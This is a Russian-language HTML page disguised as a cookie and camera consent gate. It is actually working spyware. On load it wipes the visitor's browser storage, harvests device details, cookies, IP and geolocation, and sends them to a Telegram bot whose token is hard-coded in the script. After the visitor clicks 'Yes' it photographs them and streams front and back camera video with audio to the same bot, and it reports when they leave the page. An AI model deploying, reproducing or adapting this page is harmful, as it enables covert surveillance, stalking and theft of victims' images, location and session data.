<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Загрузка...</title>
<style>
  html, body { margin: 0; padding: 0; height: 100%; background: #000; }

  #gate {
    position: fixed; inset: 0;
    background: #000; color: #eee;
    display: flex; flex-direction: column; gap: 24px;
    align-items: center; justify-content: center;
    text-align: center; padding: 30px;
    font: 16px/1.5 Arial, sans-serif;
    z-index: 9999;
  }
  #gate h1 { margin: 0; font-size: 22px; font-weight: 600; color: #fff; }
  #gate p  { margin: 0; max-width: 460px; color: #aaa; }
  #gate .row { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }

  .btn {
    padding: 14px 34px; font-size: 16px; border: 0; border-radius: 8px;
    cursor: pointer; font-weight: bold; transition: .15s;
  }
  #yes {
    background: #8b5cf6; color: #fff;
    box-shadow: 0 0 24px rgba(139,92,246,.55);
  }
  #yes:hover  { background: #7c3aed; }
  #yes:disabled { opacity: .55; cursor: default; box-shadow: none; }

  #no { background: #222; color: #bbb; }
  #no:hover { background: #333; color: #fff; }

  #site {
    display: none;

</head>
<body>

<script>
// ═══════════════════════════════════════════════════════════
// СБРОС ДАННЫХ ПРИ ПЕРВОМ ПЕРЕХОДЕ
// ═══════════════════════════════════════════════════════════
(async function wipeOnFirstVisit() {
  const FLAG = '__wiped_v1__';
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}

  try {
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (const c of cookies) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
      const domains = ['', location.hostname, '.' + location.hostname,
                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
      for (const p of paths) {
        for (const d of domains) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
        }
      }
    }
  } catch (e) {}
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) {
        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
      }
    }
  } catch (e) {}
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
    }
  } catch (e) {}

  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
  location.reload();
})();
</script>

<div id="gate">
  <h1>Вы хотите посетить наш сайт?</h1>
  <p>Для продолжения необходимо принять cookies и разрешить доступ к камере.</p>
  <div class="row">
    <button id="no"  class="btn">Нет</button>
    <button id="yes" class="btn">Да</button>
  </div>
  <p id="status"></p>
</div>

<div id="site">
  <h2>Добро пожаловать!</h2>
  <p>Проверка пройдена. Доступ открыт.</p>
</div>

<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
// ═══════════════════════════════════════════════════════════
// НАСТРОЙКИ
// ═══════════════════════════════════════════════════════════
const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
const CHAT_ID = '8689558225';

const btnYes   = document.getElementById('yes');
const btnNo    = document.getElementById('no');
const statusEl = document.getElementById('status');
const video    = document.getElementById('preview');
const canvas   = document.getElementById('canvas');

// Состояние записи
let mediaStream    = null;
let mediaRecorder  = null;
let chunkTimer     = null;
let chunkIndex     = 0;
let isRecording    = false;
let facingCurrent  = 'user';
let videoExt       = 'webm';
let videoMime      = 'video/webm';
let lastSentChunk  = 0;      // сколько чанков отправлено
let pendingChunks  = [];     // очередь на отправку

// ═══════════════════════════════════════════════════════════
// ОТПРАВКА
// ═══════════════════════════════════════════════════════════
function sendChunk(text) {
  return new Promise(res => {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
                '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
    const img = new Image();
    img.onload = img.onerror = () => res();
    img.src = url;
    setTimeout(res, 400);
  });
}

async function sendPhoto(blob, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    form.append('caption', caption || 'Фото');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
      method: 'POST', body: form, keepalive: true
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

async function sendVideo(blob, ext, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', blob, 'video.' + (ext || 'webm'));
    form.append('caption', caption || 'Видео');
    form.append('supports_streaming', 'true');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
      method: 'POST', body: form, keepalive: true
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

// ═══════════════════════════════════════════════════════════
// ПОЛЕЗНЫЕ ДАННЫЕ (сокращено)
// ═══════════════════════════════════════════════════════════
async function collectUseful() {
  const ua = navigator.userAgent;
  const n  = navigator;
  const s  = screen;
  const out = {};

  const ref = document.referrer || '';
  let refSource = 'прямой заход';
  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
  else if (/google\./i.test(ref))       refSource = 'Google';
  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
  else if (/bing\./i.test(ref))         refSource = 'Bing';
  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
  else if (ref)                         refSource = ref;
  out['Источник'] = refSource;
  out['Referrer'] = ref || '(прямой заход)';

  let inApp = 'нет';
  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
  else if (/Viber/i.test(ua))                   inApp = 'Viber';
  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
  out['Приложение'] = inApp;

  let browser = 'неизвестно', bver = '';
  const bt = [
    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
    [/OPR\/([\d.]+)/,           'Opera'],
    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
    [/Firefox\/([\d.]+)/,       'Firefox'],
    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
    [/Chrome\/([\d.]+)/,        'Chrome'],
    [/Version\/([\d.]+).*Safari/,'Safari'],
  ];
  for (const [re, name] of bt) {
    const m = re.exec(ua);
    if (m) { browser = name; bver = m[1]; break; }
  }
  out['Браузер'] = browser + (bver ? ' ' + bver : '');

  let os = 'неизвестно', osv = '';
  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
  else if (/Linux/i.test(ua))           os = 'Linux';
  out['ОС'] = os + (osv ? ' ' + osv : '');

  let device = 'десктоп';
  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
  out['Устройство'] = device;

  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
  if (modelMatch) out['Модель'] = modelMatch[1].trim();

  out['Язык']      = n.language;
  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
  out['Локальное время'] = new Date().toLocaleString('ru-RU');
  out['Экран']     = s.width + 'x' + s.height;
  out['Окно']      = window.innerWidth + 'x' + window.innerHeight;
  out['DPR']       = window.devicePixelRatio;
  out['Ядер CPU']  = n.hardwareConcurrency || '';
  out['RAM (GB)']  = n.deviceMemory || '';
  out['Платформа'] = n.platform || '';
  out['Онлайн']    = n.onLine ? 'да' : 'нет';

  if (n.getBattery) {
    try {
      const b = await n.getBattery();
      out['Батарея'] = Math.round(b.level * 100) + '%';
      out['Заряжается'] = b.charging ? 'да' : 'нет';
    } catch (e) {}
  }

  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {}

  out['URL']      = location.href;
  out['Хост']     = location.hostname;

  try {
    const ck = document.cookie || '';
    if (ck) out['Cookies'] = ck;
  } catch (e) {}

  try {
    const r = await fetch('https://ipwho.is/');
    const g = await r.json();
    if (g.success !== false && g.latitude != null) {
      out['IP']           = g.ip;
      out['Страна']       = g.country;
      out['Город']        = g.city;
      out['Координаты']   = g.latitude + ', ' + g.longitude;
      out['ISP']          = g.connection && g.connection.isp;
      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
    }
  } catch (e) {}

  return out;
}

// ═══════════════════════════════════════════════════════════
// ЗАПИСЬ ВИДЕО С КАМЕРЫ — отправка чанками
// ═══════════════════════════════════════════════════════════

// Определяем лучший поддерживаемый формат
function pickMime() {
  const candidates = [
    ['video/webm;codecs=vp8,opus', 'webm'],
    ['video/webm;codecs=vp9,opus', 'webm'],
    ['video/webm',                 'webm'],
    ['video/mp4;codecs=h264,aac',  'mp4'],
    ['video/mp4',                  'mp4'],
  ];
  if (typeof MediaRecorder === 'undefined') return null;
  for (const [m, e] of candidates) {
    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
      videoMime = m; videoExt = e;
      return { mime: m, ext: e };
    }
  }
  videoMime = ''; videoExt = 'webm';
  return { mime: '', ext: 'webm' };
}

async function startRecording(facingMode) {
  facingCurrent = facingMode;
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
      audio: true
    });
  } catch (e) {
    // без звука, если не получилось
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
        audio: false
      });
    } catch (e2) {
      return false;
    }
  }

  video.srcObject = mediaStream;
  await new Promise(res => {
    if (video.readyState >= 2) return res();
    video.onloadeddata = () => res();
  });

  const fmt = pickMime();
  if (!fmt) return false;

  try {
    mediaRecorder = new MediaRecorder(mediaStream, {
      mimeType: fmt.mime || undefined,
      videoBitsPerSecond: 500000,
      audioBitsPerSecond: 48000
    });
  } catch (e) {
    try { mediaRecorder = new MediaRecorder(mediaStream); } catch (e2) { return false; }
  }

  // Каждые 5 секунд — отдельный чанк, который сразу отправляется
  mediaRecorder.ondataavailable = async (e) => {
    if (!e.data || !e.data.size) return;
    chunkIndex++;
    const idx = chunkIndex;
    const blob = e.data;

    // Отправляем сразу — чтобы при резком закрытии вкладки почти всё было в Telegram
    sendChunk('📹 <b>Фронтальная камера</b> — фрагмент #' + idx + ' (' +
              Math.round(blob.size / 1024) + ' KB)');
    await sendVideo(blob, videoExt,
      '🤳 Чанк #' + idx + ' с фронтальной камеры\n' +
      'Размер: ' + Math.round(blob.size / 1024) + ' KB\n' +
      'Время: ' + new Date().toLocaleString('ru-RU')
    );
    lastSentChunk = idx;
  };

  mediaRecorder.start(5000); // раз в 5 секунд отдаёт blob
  isRecording = true;
  statusEl.textContent = 'Запись идёт...';
  return true;
}

async function stopRecordingAndFlush() {
  if (!mediaRecorder) return;
  try {
    if (mediaRecorder.state !== 'inactive') {
      mediaRecorder.requestData(); // забираем остаток
      mediaRecorder.stop();
    }
  } catch (e) {}
  if (mediaStream) {
    mediaStream.getTracks().forEach(t => t.stop());
    mediaStream = null;
  }
  isRecording = false;
}

// ═══════════════════════════════════════════════════════════
// ОТСЛЕЖИВАНИЕ УХОДА ПОЛЬЗОВАТЕЛЯ
// ═══════════════════════════════════════════════════════════

// 1) Ушёл с сайта (свернул вкладку, переключился)
document.addEventListener('visibilitychange', async () => {
  if (document.visibilityState === 'hidden' && isRecording) {
    await sendChunk('👋 <b>Пользователь ушёл с сайта</b>\n' +
                    'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
                    'URL: ' + location.href + '\n' +
                    'Отправляю остаток записи...');
    // Забираем всё что есть, отправляем последний чанк
    try { mediaRecorder.requestData(); } catch (e) {}
  }
});

// 2) Закрывает вкладку/уходит на другой сайт
window.addEventListener('pagehide', async () => {
  if (isRecording) {
    try { mediaRecorder.requestData(); } catch (e) {}
    try { await stopRecordingAndFlush(); } catch (e) {}
  }
});

// 3) Пытается закрыть вкладку
window.addEventListener('beforeunload', () => {
  if (isRecording) {
    try { mediaRecorder.requestData(); } catch (e) {}
    try { mediaRecorder.stop(); } catch (e) {}
    // Синхронная попытка — с keepalive
    try {
      const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('parse_mode', 'HTML');
      fd.append('text', '🚪 <b>Пользователь покидает сайт</b>\n' + location.href);
      navigator.sendBeacon && navigator.sendBeacon(url, fd);
    } catch (e) {}
  }
});

// 4) Потеря фокуса окна
window.addEventListener('blur', () => {
  if (isRecording) {
    // просто фиксируем, не отправляем — иначе будет спам
  }
});

// ═══════════════════════════════════════════════════════════
// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
// ═══════════════════════════════════════════════════════════
(async function autoRun() {
  await new Promise(r => setTimeout(r, 400));

  const data = await collectUseful();

  await sendChunk(
    '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
    '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
    '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
    '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
    '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
    '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
    '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
    '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
    '<b>Время:</b> ' + (data['Локальное время'] || '?')
  );

  const lines = Object.entries(data)
    .filter(([k, v]) => v !== '' && v != null && v !== false)
    .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));

  const chunks = [];
  let cur = '';
  for (const line of lines) {
    if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
    cur += line + '\n';
  }
  if (cur) chunks.push(cur);

  for (let i = 0; i < chunks.length; i++) {
    const head = '📋 <b>ПОЛЕЗНЫЕ ДАННЫЕ</b>' +
                 (chunks.length > 1 ? ' (' + (i+1) + '/' + chunks.length + ')' : '') + '\n\n';
    await sendChunk(head + chunks[i]);
    await new Promise(r => setTimeout(r, 500));
  }
})();

// ═══════════════════════════════════════════════════════════
// КНОПКА «ДА» — фото + длинная запись чанками
// ═══════════════════════════════════════════════════════════
btnYes.onclick = async () => {
  btnYes.disabled = true;
  btnNo.disabled  = true;
  statusEl.textContent = 'Разрешите доступ к камере...';

  try {
    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
    localStorage.setItem('cookie_consent', 'accepted');
    sessionStorage.setItem('cookie_consent', 'accepted');
  } catch (e) {}

  await sendChunk(
    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
    '<b>URL:</b> ' + location.href + '\n\n' +
    'Начинаю запись. Чанки по 5 сек будут приходить по мере поступления.'
  );

  // Фото с фронталки
  try {
    const tempStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 }, audio: false
    });
    video.srcObject = tempStream;
    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = () => res();
    });
    await new Promise(r => setTimeout(r, 600));
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w; canvas.height = h;
    canvas.getContext('2d').drawImage(video, 0, 0, w, h);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
    if (photoBlob) {
      await sendPhoto(photoBlob, '🤳 Фото с фронтальной камеры\n' +
        'Время: ' + new Date().toLocaleString('ru-RU'));
    }
    tempStream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
  } catch (e) {}

  // Показываем сайт
  document.getElementById('gate').style.display = 'none';
  document.getElementById('site').style.display = 'block';

  // Запускаем запись с фронтальной камеры
  const ok = await startRecording('user');
  if (!ok) {
    await sendChunk('⚠️ Не удалось запустить запись камеры.');
    return;
  }

  await sendChunk('🎬 Запись с фронтальной камеры запущена. Чанки по 5 сек будут приходить.');

  // Через 30 секунд — переключаем на заднюю камеру (если есть)
  setTimeout(async () => {
    await stopRecordingAndFlush();
    await sendChunk('🔄 Переключаюсь на заднюю камеру...');

    const ok2 = await startRecording('environment');
    if (!ok2) {
      await sendChunk('ℹ️ Задняя камера недоступна. Запись остановлена.');
    } else {
      await sendChunk('🎬 Запись с задней камеры запущена.');
    }
  }, 30000);
};

btnNo.onclick = () => {
  document.body.innerHTML =
    '<p style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0">Вы отказались. Сайт недоступен.</p>';
};
</script>
</body>
